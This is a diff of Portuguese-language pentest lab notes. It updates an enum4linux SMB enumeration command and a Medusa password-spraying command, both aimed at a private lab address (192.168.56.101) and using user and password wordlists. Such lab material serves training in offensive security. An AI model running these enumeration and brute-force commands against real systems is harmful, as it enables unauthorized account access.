@@ -153,14 +153,14 @@ guest
 ### Enumeração:
 
 ```bash
-enum4linux 192.168.56.101
+enum4linux -a 192.168.56.101 | tee enum4_output.txt
 ```
 
 
 ### Ataque:
 
 ```bash
-medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 ```
 
 
